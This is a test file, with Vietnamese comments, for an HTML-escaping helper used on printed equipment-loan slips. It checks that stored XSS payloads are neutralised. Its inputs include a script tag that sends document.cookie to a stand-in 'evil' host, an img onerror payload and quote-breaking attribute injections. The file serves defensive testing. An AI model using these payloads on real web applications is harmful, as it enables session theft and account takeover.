import { escapeHtml } from '../escape-html';

/**
 * Phiếu in dựng HTML bằng chuỗi rồi `document.write` vào iframe cùng origin.
 *
 * `project` và `place` là ô nhập tự do ở màn Tạo phiếu — bất kỳ nhân viên nào cũng điền được,
 * còn người đọc lại là quản lý kho lúc bấm In. Thiếu escape ở đây là mã của người mượn chạy
 * trong phiên của người duyệt.
 */
describe('escapeHtml', () => {
  it('vô hiệu hoá thẻ script nhét qua tên dự án', () => {
    const attack = '<script>fetch("//evil/"+document.cookie)</script>';

    const safe = escapeHtml(attack);

    expect(safe).not.toContain('<script>');
    expect(safe).toBe('&lt;script&gt;fetch(&quot;//evil/&quot;+document.cookie)&lt;/script&gt;');
  });

  it('vô hiệu hoá thẻ img onerror — đường tấn công không cần thẻ script', () => {
    const safe = escapeHtml('<img src=x onerror=alert(1)>');

    expect(safe).not.toContain('<img');
    expect(safe).toContain('&lt;img');
  });

  it('escape cả nháy đơn và nháy kép vì có giá trị nằm trong thuộc tính', () => {
    expect(escapeHtml(`" onmouseover="alert(1)`)).toBe(
      '&quot; onmouseover=&quot;alert(1)',
    );
    expect(escapeHtml("' onfocus='alert(1)")).toBe('&#39; onfocus=&#39;alert(1)');
  });

  it('KHÔNG escape hai lần: & của thực thể vừa sinh ra phải giữ nguyên', () => {
    // Xử lý `&` ở một lượt riêng trước là lỗi kinh điển — `<` thành `&lt;` rồi lượt sau biến
    // tiếp thành `&amp;lt;`, và phiếu in hiện ra chuỗi rác thay vì dấu nhỏ hơn.
    expect(escapeHtml('a < b')).toBe('a &lt; b');
    expect(escapeHtml('Tôm & Cá')).toBe('Tôm &amp; Cá');
  });

  it('giữ nguyên chữ tiếng Việt có dấu', () => {
    expect(escapeHtml('Quay TVC khách hàng ABC')).toBe('Quay TVC khách hàng ABC');
  });

  it('null và undefined ra chuỗi rỗng, không ra chữ "null" giữa biên bản', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('số và giá trị khác chuỗi vẫn dùng được', () => {
    expect(escapeHtml(7)).toBe('7');
    expect(escapeHtml(0)).toBe('0');
  });
});
